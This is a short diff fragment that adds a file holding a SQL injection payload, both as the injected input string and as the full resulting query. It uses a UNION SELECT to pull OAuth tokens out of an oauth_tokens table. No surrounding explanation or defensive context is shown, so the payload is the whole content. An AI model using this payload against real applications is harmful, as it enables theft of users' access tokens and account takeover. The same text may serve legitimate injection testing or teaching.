@@ -1,0 +1,11 @@
+
+
+
+
+SELECT artist, song FROM media WHERE artist = '' AND 1=0 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE 1=1 OR ''=''
+
+
+
+' AND 1=0 UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE 1=1 OR ''='
+
+
